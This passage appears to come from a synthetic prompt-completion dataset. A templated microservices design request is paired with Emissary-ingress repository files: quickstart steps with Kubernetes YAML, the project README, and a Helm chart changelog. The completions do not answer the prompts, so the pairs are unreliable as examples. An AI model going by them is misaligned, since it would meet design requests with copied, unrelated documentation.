`emissary` namespace. How exactly you\nconnect to that Service will vary with your cluster provider, but you can\nstart with\n\n```bash\nkubectl get svc -n emissary emissary-emissary-ingress\n```\n\nand that should get you started. Or, of course, you can use something like\n\n```bash\nkubectl port-forward -n emissary svc/emissary-emissary-ingress 8080:80\n```\n\n(after you configure a Listener!) and then talk to localhost:8080 with any\nkind of cluster.\n\n## Using Faces for a sanity check\n\n[Faces Demo]: https://github.com/buoyantio/faces-demo\n\nIf you like, you can continue by using the [Faces Demo] as a quick sanity\ncheck. First, install Faces itself using Helm:\n\n```bash\nhelm install faces \\\n --namespace faces --create-namespace \\\n oci://ghcr.io/buoyantio/faces-chart --version 2.0.0-rc.4 \\\n --wait\n```\n\nNext, you'll need to configure Emissary to route to Faces. First, we'll do the\nbasic configuration to tell Emissary to listen for HTTP traffic:\n\n```bash\nkubectl apply -f - <<EOF\n---\napiVersion: getambassador.io/v3alpha1\nkind: Listener\nmetadata:\n  name: ambassador-https-listener\nspec:\n  port: 8443\n  protocol: HTTPS\n  securityModel: XFP\n  hostBinding:\n    namespace:\n      from: ALL\n---\napiVersion: getambassador.io/v3alpha1\nkind: Listener\nmetadata:\n  name: ambassador-http-listener\nspec:\n  port: 8080\n  protocol: HTTP\n  securityModel: XFP\n  hostBinding:\n    namespace:\n      from: ALL\n---\napiVersion: getambassador.io/v3alpha1\nkind: Host\nmetadata:\n  name: wildcard-host\nspec:\n  hostname: \"*\"\n  requestPolicy:\n    insecure:\n      action: Route\nEOF\n```\n\n(This actually supports both HTTPS and HTTP, but since we haven't set up TLS\ncertificates, we'll just stick with HTTP.)\n\nNext, we need two Mappings:\n\n| Prefix    | Routes to Service | in Namespace |\n| --------- | ----------------- | ------------ |\n| `/faces/` | `faces-gui`       | `faces`      |\n| `/face/`  | `face`            | `faces`      |\n\n```bash\nkubectl apply -f - <<EOF\n---\napiVersion: getambassador.io/v3alpha1\nkind: Mapping\nmetadata:\n  name: gui-mapping\n  namespace: faces\nspec:\n  hostname: \"*\"\n  prefix: /faces/\n  service: faces-gui.faces\n  rewrite: /\n  timeout_ms: 0\n---\napiVersion: getambassador.io/v3alpha1\nkind: Mapping\nmetadata:\n  name: face-mapping\n  namespace: faces\nspec:\n  hostname: \"*\"\n  prefix: /face/\n  service: face.faces\n  timeout_ms: 0\nEOF\n```\n\nOnce that's done, then you'll be able to access the Faces Demo at `/faces/`,\non whatever IP address or hostname your cluster provides for the\n`emissary-emissary-ingress` Service. Or you can port-forward as above and\naccess it at `http://localhost:8080/faces/`.\n", "metadata": {"source": "github.com/emissary-ingress/emissary", "file_path": "QUICKSTART.md", "language": "markdown", "complexity": "medium", "star_count": 4436, "quality_score": 0.6599999999999999, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 177}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "Emissary-ingress\n================\n\n<!-- [![Alt Text][image-url]][link-url] -->\n[![Version][badge-version-img]][badge-version-link]\n[![Docker Repository][badge-docker-img]][badge-docker-link]\n[![Join Slack][badge-slack-img]][badge-slack-link]\n[![Core Infrastructure Initiative: Best Practices][badge-cii-img]][badge-cii-link]\n[![Artifact HUB][badge-artifacthub-img]][badge-artifacthub-link]\n\n[badge-version-img]: https://img.shields.io/docker/v/emissaryingress/emissary?sort=semver\n[badge-version-link]: https://github.com/emissary-ingress/emissary/releases\n[badge-docker-img]: https://img.shields.io/docker/pulls/emissaryingress/emissary\n[badge-docker-link]: https://hub.docker.com/r/emissaryingress/emissary\n[badge-slack-img]: https://img.shields.io/badge/slack-join-orange.svg\n[badge-slack-link]: https://communityinviter.com/apps/cloud-native/cncf\n[badge-cii-img]: https://bestpractices.coreinfrastructure.org/projects/1852/badge\n[badge-cii-link]: https://bestpractices.coreinfrastructure.org/projects/1852\n[badge-artifacthub-img]: https://img.shields.io/endpoint?url=https://artifacthub.io/badge/repository/emissary-ingress\n[badge-artifacthub-link]: https://artifacthub.io/packages/helm/datawire/emissary-ingress\n\n<!-- Links are (mostly) at the end of this document, for legibility. -->\n\n---\n\n## QUICKSTART\n\nLooking to get started as quickly as possible? Check out [the\nQUICKSTART](QUICKSTART.md)!\n\n### Latest Release\n\nThe latest production version of Emissary is **3.10.0**.\n\n**Note well** that there is also an Ambassador Edge Stack 3.10.0, but\n**Emissary 3.10 and Edge Stack 3.10 are not equivalent**. Their codebases have\ndiverged and will continue to do so.\n\n---\n\nEmissary-ingress\n================\n\n[Emissary-ingress](https://www.getambassador.io/docs/open-source) is an\nopen-source, developer-centric, Kubernetes-native API gateway built on [Envoy\nProxy]. Emissary-ingress is a CNCF incubating project (and was formerly known\nas Ambassador API Gateway).\n\n### Design Goals\n\nThe first problem faced by any organization trying to develop cloud-native\napplications is the _ingress problem_: allowing users outside the cluster to\naccess the application running inside the cluster. Emissary is built around\nthe idea that the application developers should be able to solve the ingress\nproblem themselves, without needing to become Kubernetes experts and without\nneeding dedicated operations staff: a self-service, developer-centric workflow\nis necessary to develop at scale.\n\nEmissary is open-source, developer-centric, role-oriented, opinionated, and\nKubernatives-native.\n\n- open-source: Emissary is licensed under the Apache 2 license, permitting use\n  or modification by anyone.\n- developer-centric: Emissary is designed taking the application developer\n  into account first.\n- role-oriented: Emissary's configuration deliberately tries to separate\n  elements to allow separation of concerns between developers and operations.\n- opinionated: Emissary deliberately tries to make easy things easy, even if\n  that comes of the cost of not allowing some uncommon features.\n\n### Features\n\nEmissary supports all the table-stakes features needed for a modern API\ngateway:\n\n* Per-request [load balancing]\n* Support for routing [gRPC], [HTTP/2], [TCP], and [web sockets]\n* Declarative configuration via Kubernetes [custom resources]\n* Fine-grained [authentication] and [authorization]\n* Advanced routing features like [canary releases], [A/B testing], [dynamic routing], and [sticky sessions]\n* Resilience features like [retries], [rate limiting], and [circuit breaking]\n* Observability features including comprehensive [metrics] support using the [Prometheus] stack\n* Easy service mesh integration with [Linkerd], [Istio], [Consul], etc.\n* [Knative serverless integration]\n\nSee the full list of [features](https://www.getambassador.io/docs/emissary) here.\n\n### Branches\n\n(If you are looking at this list on a branch other than `master`, it\nmay be out of date.)\n\n- [`main`](https://github.com/emissary-ingress/emissary/tree/main): Emissary 4 development work\n\n**No further development is planned on any branches listed below.**\n\n- [`master`](https://github.com/emissary-ingress/emissary/tree/master) - **Frozen** at Emissary 3.10.0\n- [`release/v3.10`](https://github.com/emissary-ingress/emissary/tree/release/v3.10) - Emissary-ingress 3.10.0 release branch\n- [`release/v3.9`](https://github.com/emissary-ingress/emissary/tree/release/v3.9)\n  - Emissary-ingress 3.9.1 release branch\n- [`release/v2.5`](https://github.com/emissary-ingress/emissary/tree/release/v2.5) - Emissary-ingress 2.5.1 release branch\n\n**Note well** that there is also an Ambassador Edge Stack 3.10.0, but\n**Emissary 3.10 and Edge Stack 3.10 are not equivalent**. Their codebases have\ndiverged and will continue to do so.\n\n#### Community\n\nEmissary-ingress is a CNCF Incubating project and welcomes any and all\ncontributors.\n\nCheck out the [`Community/`](Community/) directory for information on\nthe way the community is run, including:\n\n - the [`CODE_OF_CONDUCT.md`](Community/CODE_OF_CONDUCT.md)\n - the [`GOVERNANCE.md`](Community/GOVERNANCE.md) structure\n - the list of [`MAINTAINERS.md`](Community/MAINTAINERS.md)\n - the [`MEETING_SCHEDULE.md`](Community/MEETING_SCHEDULE.md) of\n   regular trouble-shooting meetings and contributor meetings\n - how to get [`SUPPORT.md`](Community/SUPPORT.md).\n\nThe best way to join the community is to join the `#emissary-ingress` channel\nin the [CNCF Slack]. This is also the best place for technical information\nabout Emissary's architecture or development.\n\nIf you're interested in contributing, here are some ways:\n* Write a blog post for [our blog](https://blog.getambassador.io)\n* Investigate an [open issue](https://github.com/emissary-ingress/emissary/issues)\n* Add [more tests](https://github.com/emissary-ingress/emissary/tree/main/ambassador/tests)\n\n<!-- Please keep this list sorted. -->\n[CNCF Slack]: https://communityinviter.com/apps/cloud-native/cncf\n[Envoy Proxy]: https://www.envoyproxy.io\n\n<!-- Legacy: clean up these links! -->\n\n[authentication]: https://www.getambassador.io/docs/emissary/latest/topics/running/services/auth-service/\n[canary releases]: https://www.getambassador.io/docs/emissary/latest/topics/using/canary/\n[circuit breaking]: https://www.getambassador.io/docs/emissary/latest/topics/using/circuit-breakers/\n[Consul]: https://www.getambassador.io/docs/emissary/latest/howtos/consul/\n[CRDs]: https://kubernetes.io/docs/concepts/extend-kubernetes/api-extension/custom-resources/\n[Datadog]: https://www.getambassador.io/docs/emissary/latest/topics/running/statistics/#datadog\n[Grafana]: https://www.getambassador.io/docs/emissary/latest/topics/running/statistics/#grafana\n[gRPC and HTTP/2]: https://www.getambassador.io/docs/emissary/latest/howtos/grpc/\n[Istio]: https://www.getambassador.io/docs/emissary/latest/howtos/istio/\n[Knative serverless integration]: https://www.getambassador.io/docs/emissary/latest/howtos/knative/\n[Linkerd]: https://www.getambassador.io/docs/emissary/latest/howtos/linkerd2/\n[load balancing]: https://www.getambassador.io/docs/emissary/latest/topics/running/load-balancer/\n[metrics]: https://www.getambassador.io/docs/emissary/latest/topics/running/statistics/\n[Prometheus]: https://www.getambassador.io/docs/emissary/latest/topics/running/statistics/#prometheus\n[rate limiting]: https://www.getambassador.io/docs/emissary/latest/topics/running/services/rate-limit-service/\n[self-service configuration]: https://www.getambassador.io/docs/emissary/latest/topics/using/mappings/\n[sticky sessions]: https://www.getambassador.io/docs/emissary/latest/topics/running/load-balancer/#sticky-sessions--session-affinity\n[TCP]: https://www.getambassador.io/docs/emissary/latest/topics/using/tcpmappings/\n[TLS]: https://www.getambassador.io/docs/emissary/latest/howtos/tls-termination/\n[web sockets]: https://www.getambassador.io/docs/emissary/latest/topics/using/tcpmappings/\n", "metadata": {"source": "github.com/emissary-ingress/emissary", "file_path": "README.md", "language": "markdown", "complexity": "medium", "star_count": 4436, "quality_score": 0.63, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": true, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": true, "line_count": 157}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Change Log\n\nThis file documents all notable changes to Ambassador Helm Chart. The release\nnumbering uses [semantic versioning](http://semver.org).\n\n## v8.10.0 - TBD\n\n- Upgrade Emissary to v3.10.0 [CHANGELOG](https://github.com/emissary-ingress/emissary/blob/master/CHANGELOG.md)\n- Ambassador Agent is no longer installed by default and requires setting `agent.enabled: true` to opt-in. We recommend you\nuse the stand alone chart instead [AmbassadorAgent Repo](https://github.com/datawire/ambassador-agent).\n\n## v8.9.0\n\n- Upgrade Emissary to v3.9.0 [CHANGELOG](https://github.com/emissary-ingress/emissary/blob/master/CHANGELOG.md)\n- Feature: configure autoscaling behaviors for HorizontalPodAutoscaler in `.Values.autoscaling.behavior`\n- Fix: wrong autoscaling apiVersion on EKS due to EKS not following semver (see https://github.com/aws/containers-roadmap/issues/1404, https://github.com/helm/helm/issues/10375, https://github.com/helm/helm/issues/12053)\n\n## v8.8.0\n\n- Upgrade Emissary to v3.8.0 [CHANGELOG](https://github.com/emissary-ingress/emissary/blob/master/CHANGELOG.md)\n- Fix: Ambassador Agent RBAC so that it can properly find cloud connect tokens in a secret\n- Upgrade Ambassador Agent to the latest z-patch of 1.0.14.\n\n## v8.7.1 - 2023-07-13\n\n- Upgrade Emissary to v3.7.1 [CHANGELOG](https://github.com/emissary-ingress/emissary/blob/master/CHANGELOG.md)\n\n## v8.7.0 - 2023-06-20\n\n- Upgrade Emissary to v3.7.0 [CHANGELOG](https://github.com/emissary-ingress/emissary/blob/master/CHANGELOG.md)\n\n## v8.6.0 - 2023-04-17\n\n- Upgrade Emissary to v3.6.0 [CHANGELOG](https://github.com/emissary-ingress/emissary/blob/master/CHANGELOG.md)\n- Use autoscaling/v2 HorizontalPodAutoscaler if the cluster version is >=v1.23 as autoscaling/v2beta2 is deprecated starting v1.23 and removed in v1.26. Thanks to [Eivind Valderhaug](https://github.com/eevdev)\n- Upgrade KubernetesEndpointResolver & ConsulResolver apiVersions to `getambassador.io/v3alpha1`\n- Add support for setting `nodeSelector`, `tolerations` and `affinity` on the Ambassador Agent. Thanks to [Philip Panyukov](https://github.com/ppanyukov).\n\n## v8.5.1 - 2023-02-23\n\n- Upgrade Emissary to v3.5.1 [CHANGELOG](https://github.com/emissary-ingress/emissary/blob/master/CHANGELOG.md)\n- Fix regression where the Module resource fails validation when setting the ambassador_id after upgrading to `getambassador.io/v3alpha1`. Thanks to [pie-r](https://github.com/pie-r)\n\n## v8.5.0 - 2023-02-15\n\n- Upgrade Emissary to v3.5.0 [CHANGELOG](https://github.com/emissary-ingress/emissary/blob/master/CHANGELOG.md)\n- Adds support for configuring a startupProbe on the emissary-ingress deployments. This is useful when a larger number of resources\n  are used and the initial startup needs additional time. See for details https://github.com/emissary-ingress/emissary/pull/4649.\n- Update default module resource to use `getambassador.io/v3alpha1`. Thanks to [Luke Swithenbank](https://github.com/lswith)\n\n## v8.4.0 - 2022-01-03\n\n- Upgrade Emissary to v3.4.0 [CHANGELOG](https://github.com/emissary-ingress/emissary/blob/master/CHANGELOG.md)\n\n- The Ambassador agent that was previously embedded in Emissary Ingress has been moved to a standalone container.\n\n## v8.3.0\n\n- Upgrade Emissary to v3.3.0 [CHANGELOG](https://github.com/emissary-ingress/emissary/blob/master/CHANGELOG.md)\n\n- Change: By default, the Ambassador agent will report diagnostics to the Ambassador Cloud\n\n- Change: updated auto-scaling resource cpu and memory variable ordering to help with git-ops syncing. Also, adjusted memory and cpu settings to be more friendly so that they do not cause the HPA auto-scaling to trigger during start-up. Thanks to [Ian Martin](https://github.com/aztechian) for the contribution!\n\n## v8.2.0\n\n- Upgrade Emissary to v3.2.0 [CHANGELOG](https://github.com/emissary-ingress/emissary/blob/master/CHANGELOG.md)\n\n- Bugfix: The default Role configuration of the Ambassador Agent Deployment will allow it to correctly watch Secret resources for Ambassador Cloud tokens.\n\n## v8.1.0\n\n- Upgrade Emissary to v3.1.0 [CHANGELOG](https://github.com/emissary-ingress/emissary/blob/master/CHANGELOG.md)\n\n- Change: The default for the `module` value has changed to enable serving remote client requests to the <code>:8877/ambassador/v0/diag/</code> endpoint by default.\n\n## v8.0.0\n\n- Upgrade Emissary to v3.0.0 [CHANGELOG](https://github.com/emissary-ingress/emissary/blob/master/CHANGELOG.md)\n\n- Change: The default for the `module` value has changed to disable\n  the `/ambassador/v0/` → `127.0.0.1:8877` synthetic Mapping by\n  default. We have long recommended to turn this off for production\n  use; it is now off by default.\n\n- Bugfix: The default values no trigger the creation of an\n  \"emissary-test-ready\" Pod. This Pod was meant to only be created\n  when running the chart's test suite; it was not meant to be created\n  in users' clusters.\n\n## v7.5.0\n\n- Upgrade Emissary to v2.4.0 [CHANGELOG](https://github.com/emissary-ingress/emissary/blob/master/CHANGELOG.md)\n\n## v7.4.2\n\n- Update Emissary chart image to version v2.3.2 [CHANGELOG](https://github.com/emissary-ingress/emissary/blob/master/CHANGELOG.md)\n\n## v7.4.1\n\n- Update Emissary chart image to version v2.3.1 [CHANGELOG](https://github.com/emissary-ingress/emissary/blob/master/CHANGELOG.md)\n\n## v7.4.0\n\n- Update change Emissary chart image to version v2.3.0 [CHANGELOG](https://github.com/emissary-ingress/emissary/blob/master/CHANGELOG.md)\n- Add \"lifecycle\" option to main container. This can be used, for example, to add a lifecycle.preStop hook. Thanks to [Eric Totten](https://github.com/etotten) for the contribution!\n- Add `ambassador_id` to listener manifests rendered when using `createDefaultListeners: true` with `AMBASSADOR_ID` set in environment variables. Thanks to [Jennifer Reed](https://github.com/ServerNinja) for the contribution!\n- Feature: Added configurable IngressClass resource to be compliant with Kubernetes 1.22+ ingress specification.\n\n## v7.3.2\n\n- Upgrade Emissary to v2.2.2 [CHANGELOG](https://github.com/emissary-ingress/emissary/blob/master/CHANGELOG.md)\n\n## v7.3.1\n\n- Upgrade Emissary to v2.2.1 [CHANGELOG](https://github.com/emissary-ingress/emissary/blob/master/CHANGELOG.md)\n\n## v7.3.0\n\n- Upgrade Emissary to v2.2.0 [CHANGELOG](https://github.com/emissary-ingress/emissary/blob/master/CHANGELOG.md)\n\n## v7.2.2\n\n- Update Emissary chart image to version v2.1.2: [CHANGELOG](https://github.com/emissary-ingress/emissary/blob/master/CHANGELOG.md)\n\n## v7.2.1\n\nThere was no v7.2.1 release; we skipped to v7.2.2 to keep the version\nnumber in-sync with the edge-stack chart.\n\n## v7.2.0\n\n- Update Emissary chart image to version v2.1.0: [CHANGELOG](https://github.com/emissary-ingress/emissary/blob/master/CHANGELOG.md)\n- Change: It is now _always_ nescessary to manually apply `emissary-crds.yaml` before applying the chart.\n- Bugfix: When setting `adminService.snapshotPort`, it now points at the correct port on the Pod.\n\n## v7.1.10\n\n- Update Ambassador chart image to version v2.0.5: [CHANGELOG](https://github.com/emissary-ingress/emissary/blob/master/CHANGELOG.md)\n\n## v7.1.9\n\n- Update Ambassador chart image to version v2.0.4: [CHANGELOG](https://github.com/emissary-ingress/emissary/blob/master/CHANGELOG.md)\n\n## v7.1.8-ea\n\n- Update Ambassador chart image to version v2.0.3-ea: [CHANGELOG](https://github.com/emissary-ingress/emissary/blob/master/CHANGELOG.md)\n\n## v7.1.2-ea\n\n- Update Ambassador chart image to version v2.0.2-ea: [CHANGELOG](https://github.com/emissary-ingress/emissary/blob/master/CHANGELOG.md)\n\n## v7.1.1-ea\n\n- Update Ambassador chart image to version v2.0.1-ea: [CHANGELOG](https://github.com/emissary-ingress/emissary/blob/master/CHANGELOG.md)\n\n## v7.1.0-ea\n\n- Feature: New canarying features for Ambassador in the chart that allow creation of a secondary deployment/service to test new versions and environment variables.\n- Feature: Exposed `progressDeadlineSeconds` for the Ambassador and Ambassador Agent Deployments with new values\n\n## v7.0.0-ea\n\nWe're pleased to introduce Emissary 2.0.0 as a developer preview.\n\nEmissary Ingress chart v7.0.0-ea provides early access to Emissary 2.0 features. [Learn more in our docs](https://www.getambassador.io/docs/emissary/latest/about/changes-2.0.0/)\n\n- Update Ambassador chart image to version v2.0.0-ea: [CHANGELOG](https://github.com/emissary-ingress/emissary/blob/master/CHANGELOG.md)\n- Change: removed helm 2 support\n- Feature: Add an option to create default HTTP and HTTPS listeners\n\n## v6.9.5\n\n- Update Ambassador API Gateway chart image to version v1.14.4: [CHANGELOG](https://github.com/emissary-ingress/emissary/blob/master/CHANGELOG.md)\n- Update Ambassador Edge Stack chart image to version v1.14.4: [CHANGELOG](https://github.com/emissary-ingress/emissary/blob/master/CHANGELOG.md)\n\n## v6.9.4\n\n- Update Ambassador API Gateway chart image to version v1.14.3: [CHANGELOG](https://github.com/emissary-ingress/emissary/blob/master/CHANGELOG.md)\n- Update Ambassador Edge Stack chart image to version v1.14.3: [CHANGELOG](https://github.com/emissary-ingress/emissary/blob/master/CHANGELOG.md)\n\n## v6.9.3\n\n- Update Ambassador API Gateway chart image to version v1.14.2: [CHANGELOG](https://github.com/emissary-ingress/emissary/blob/master/CHANGELOG.md)\n- Update Ambassador Edge Stack chart image to version v1.14.2: [CHANGELOG](https://github.com/emissary-ingress/emissary/blob/master/CHANGELOG.md)\n\n(v6.9.2 was withdrawn)\n\n## v6.9.1\n\n- Update Ambassador API Gateway chart image to version v1.14.1: [CHANGELOG](https://github.com/emissary-ingress/emissary/blob/master/CHANGELOG.md)\n- Update Ambassador Edge Stack chart image to version v1.14.1: [CHANGELOG](https://github.com/emissary-ingress/emissary/blob/master/CHANGELOG.md)\n\n## v6.9.0\n\n- Update Ambassador Edge Stack chart image to version v1.14.0: [CHANGELOG](https://github.com/emissary-ingress/emissary/blob/master/CHANGELOG.md)\n\n## v6.8.0\n\n- Update Ambassador API Gateway chart image to version v1.14.0: [CHANGELOG](https://github.com/emissary-ingress/emissary/blob/master/CHANGELOG.md)\n\n## v6.7.14\n\n- Feature: New Values to expose `progressDeadlineSeconds` for the Ambassador and Ambassador-agent Deployments.\n\n## v6.7.13\n\n- Update Ambassador API Gateway chart image to version v1.13.10: [CHANGELOG](https://github.com/emissary-ingress/emissary/blob/master/CHANGELOG.md)\n- Update Ambassador Edge Stack chart image to version v1.13.10: [CHANGELOG](https://github.com/emissary-ingress/emissary/blob/master/CHANGELOG.md)\n\n## v6.7.12\n\n- Update Ambassador API Gateway chart image to version v1.13.9: [CHANGELOG](https://github.com/emissary-ingress/emissary/blob/master/CHANGELOG.md)\n- Update Ambassador Edge Stack chart image to version v1.13.9: [CHANGELOG](https://github.com/emissary-ingress/emissary/blob/master/CHANGELOG.md)\n\n## v6.7.11\n\n- Update Ambassador API Gateway chart image to version v1.13.8: [CHANGELOG](https://github.com/emissary-ingress/emissary/blob/master/CHANGELOG.md)\n- Update Ambassador Edge Stack chart image to version v1.13.8: [CHANGELOG](https://github.com/emissary-ingress/emissary/blob/master/CHANGELOG.md)\n- Bugfix: remove duplicate label key in ambassador-agent deployment\n\n## v6.7.10\n\n- Update Ambassador API Gateway chart image to version v1.13.7: [CHANGELOG](https://github.com/emissary-ingress/emissary/blob/master/CHANGELOG.md)\n- Update Ambassador Edge Stack chart image to version v1.13.7: [CHANGELOG](https://github.com/emissary-ingress/emissary/blob/master/CHANGELOG.md)\n\n## v6.7.9\n\n- Update Ambassador chart image to version 1.13.6: [CHANGELOG](https://github.com/datawire/ambassador/blob/master/CHANGELOG.md)\n\n## v6.7.8\n\n- Update Ambassador chart image to version 1.13.5: [CHANGELOG](https://github.com/datawire/ambassador/blob/master/CHANGELOG.md)\n\n## v6.7.7\n\n- Bugfix: ambassador-injector and telepresence-proxy now use the correct default image repository\n\n## v6.7.6\n\n- Update Ambassador chart image to version 1.13.4: [CHANGELOG](https://github.com/datawire/ambassador/blob/master/CHANGELOG.md)\n- Change: unless image.repository or image.fullImageOverride is explicitly set, the ambassador image used will be templated on .Values.enableAES. If AES is enabled, the chart will use docker.io/datawire/aes, otherwise will use docker.io/datawire/ambassador.\n\n## v6.7.5\n\n- Update Ambassador chart image to version v1.13.3: [CHANGELOG](https://github.com/datawire/ambassador/blob/master/CHANGELOG.md)\n\n## v6.7.4\n\n- Feature: The [Ambassador Module](https://www.getambassador.io/docs/edge-stack/latest/topics/running/ambassador/) can now be configured and managed by Helm\n\n## v6.7.3\n\n- Update Ambassador chart image to version v1.13.2: [CHANGELOG](https://github.com/datawire/ambassador/blob/master/CHANGELOG.md)\n\n## v6.7.2\n\n- Bugfix: Don't change the Role name when running in singleNamespace mode.\n\n## v6.7.1\n\n- Update Ambassador chart image to version v1.13.1: [CHANGELOG](https://github.com/datawire/ambassador/blob/master/CHANGELOG.md)\n\n## v6.7.0\n\n- Update Ambassador to version 1.13.0: [CHANGELOG](https://github.com/datawire/ambassador/blob/master/CHANGELOG.md)\n- Feature: Ambassador Agent now available for API Gateway (https://app.getambassador.io)\n- Feature: Add support for [pod toplology spread constraints](https://kubernetes.io/docs/concepts/workloads/pods/pod-topology-spread-constraints/) via the `topologySpreadConstraints` helm value to the Ambassador deployment. (thanks, [@lawliet89](https://github.com/lawliet89)!)\n- BugFix: Add missing `ambassador_id` for resolvers.\n- Change: Ambassador ClusterRoles are now aggregated under the label `rbac.getambassador.io/role-group`. The aggregated role has the same name as the previous role name (so no need to update ClusterRoleBindings).\n\n## v6.6.4\n\n- Update Ambassador to version 1.12.4: [CHANGELOG](https://github.com/datawire/ambassador/blob/master/CHANGELOG.md)\n\n## v6.6.3\n\n- Update Ambassador to version 1.12.3: [CHANGELOG](https://github.com/datawire/ambassador/blob/master/CHANGELOG.md)\n\n## v6.6.2\n\n- Update Ambassador to version 1.12.2: [CHANGELOG](https://github.com/datawire/ambassador/blob/master/CHANGELOG.md)\n\n## v6.6.1\n\n- Fix metadata field in ConsulRevoler\n- Make resolvers available to OSS\n\n## v6.6.0\n\n- Update Ambassador to version 1.12.1: [CHANGELOG](https://github.com/datawire/ambassador/blob/master/CHANGELOG.md)\n- Feature: Apply Ambassador Agent deployment by default to enable Service Catalog reporting (https://app.getambassador.io)\n\n## v6.5.22\n\n- Bugfix: Disable the cloud agent by default. The agent will be enabled in 6.6.0.\n- Bugfix: Adds a check to prevent the cloud agent from being installed if AES version is less than 1.12.0\n\n## v6.5.21\n\n- Update Ambassador to version 1.12.0: [CHANGELOG](https://github.com/datawire/ambassador/blob/master/CHANGELOG.md)\n- Feature: Add support for the ambassador-agent, reporting to Service Catalog (https://app.getambassador.io)\n- Feature: All services are automatically instrumented with discovery annotations.\n\n## v6.5.20\n\n- Update Ambassador to version v1.11.2: [CHANGELOG](https://github.com/datawire/ambassador/blob/master/CHANGELOG.md)\n\n## v6.5.19\n\n- Make all `livenessProbe` and `readinessProbe` configurations available to the values file\n\n## v6.5.18\n\n- Update Ambassador to version v1.11.1: [CHANGELOG](https://github.com/datawire/ambassador/blob/master/CHANGELOG.md)\n\n## v6.5.17\n\n- Update Ambassador to version v1.11.0: [CHANGELOG](https://github.com/datawire/ambassador/blob/master/CHANGELOG.md)\n- Bugfix: Fix Mapping definition to correctly support labels in use.\n\n## v6.5.16\n\n- Bugfix: Ambassador CRD cleanup will now execute as expected.\n\n## v6.5.15\n\n- Bugfix: Ambassador RBAC now includes permissions for IngressClasses.\n\n## v6.5.14\n\n- Update for Ambassador v1.10.0\n\n## v6.5.13\n\n- Update for Ambassador v1.9.1\n\n## v6.5.12\n\n- Feature: Add ability to configure `terminationGracePeriodSeconds` for the Ambassador container\n- Update for Ambassador v1.9.0\n\n## v6.5.11\n\n- Feature: add affinity and tolerations support for redis pods\n\n## v6.5.10\n\n- Update Ambassador to version 1.8.1: [CHANGELOG](https://github.com/datawire/ambassador/blob/master/CHANGELOG.md)\n\n## v6.5.9\n\n- Update Ambassador to version 1.8.0: [CHANGELOG](https://github.com/datawire/ambassador/blob/master/CHANGELOG.md)\n- Bugfix: The RBAC for AES now grants permission to \"patch\" Events.v1.core. Previously it granted \"create\" but not \"patch\".\n\n## v6.5.8\n\n- Update Ambassador to version 1.7.4: [CHANGELOG](https://github.com/datawire/ambassador/blob/master/CHANGELOG.md)\n\n## v6.5.7\n\n- Update Ambassador to version 1.7.3: [CHANGELOG](https://github.com/datawire/ambassador/blob/master/CHANGELOG.md)\n- The BusyBox image image used by `test-ready` is now configurable (thanks, [Alan Silva](https://github.com/OmegaVVeapon)!)\n\n## v6.5.6\n\n- Update Ambassador to version 1.7.2: [CHANGELOG](https://github.com/datawire/ambassador/blob/master/CHANGELOG.md)\n- Feature: Allow overriding the namespace for the release using the values file: [ambassador-chart/#122](https://github.com/datawire/ambassador-chart/pull/122)\n\n## v6.5.5\n\n- Allow hyphens in service annotations: [CHANGELOG](https://github.com/datawire/ambassador/blob/master/CHANGELOG.md)\n\n## v6.5.4\n\n- Upgrade Ambassador to version 1.7.1: [CHANGELOG](https://github.com/datawire/ambassador/blob/master/CHANGELOG.md)\n\n## v6.5.3\n\n- Upgrade Ambassador to version 1.7.0: [CHANGELOG](https://github.com/datawire/ambassador/blob/master/CHANGELOG.md)\n\n## v6.5.2\n\n- Feature: Add support for DaemonSet/Deployment labels: [ambassador-chart/#114](https://github.com/datawire/ambassador-chart/pull/114)\n- Upgrade Ambassador to version 1.6.2: [CHANGELOG](https://github.com/datawire/ambassador/blob/master/CHANGELOG.md)\n\n## v6.5.1\n\n- Upgrade Ambassador to version 1.6.1: [CHANGELOG](https://github.com/datawire/ambassador/blob/master/CHANGELOG.md)\n\n## v6.5.0\n\n- Upgrade Ambassador to version 1.6.0: [CHANGELOG}](https://github.com/datawire/ambassador/blob/master/CHANGELOG.md)\n\n## v6.4.10\n\n- Feature: Allow specifying annotations for the license-key-secret: [ambassador-chart/#106](https://github.com/datawire/ambassador-chart/issues/106)\n- Feature: Annotation for keeping the AES secret on removal: [ambassador-chart/#110](https://github.com/datawire/ambassador-chart/issues/110)\n- Fix: do not mount the secret if we do not want a secret: [ambassador-chart/#103](https://github.com/datawire/ambassador-chart/issues/103)\n- Internal CI refactorings.\n\n## v6.4.9\n\n- BugFix: Cannot specify podSecurityPolicies: [ambassador-chart/#97](https://github.com/datawire/ambassador-chart/issues/97)\n\n## v6.4.8\n\n- Upgrade Ambassador to version 1.5.5: [CHANGELOG](https://github.com/datawire/ambassador/blob/master/CHANGELOG.md)\n\n## v6.4.7\n\n- BugFix: Registry service is now using the proper `app.kubernetes.io/name`\n- BugFix: Restore ability to set `REDIS` env vars in `env` instead of `redisEnv`\n- Feature: Add `envRaw` to support supplying raw yaml for environment variables. Deprecates `redisEnv`.\n\n## v6.4.6\n\n- Upgrade Ambassador to version 1.5.4: [CHANGELOG](https://github.com/datawire/ambassador/blob/master/CHANGELOG.md)\n- Added support setting external IPs for the ambassador service (thanks, [Jason Smith](https://github.com/jasons42)!)\n\n## v6.4.5\n\n- Upgrade Ambassador to version 1.5.3: [CHANGELOG](https://github.com/datawire/ambassador/blob/master/CHANGELOG.md)\n\n## v6.4.4\n\n- Feature flag for enabling or disabling the [`Project` registry](https://www.getambassador.io/docs/edge-stack/latest/topics/using/projects/)\n- redisEnv for setting environment 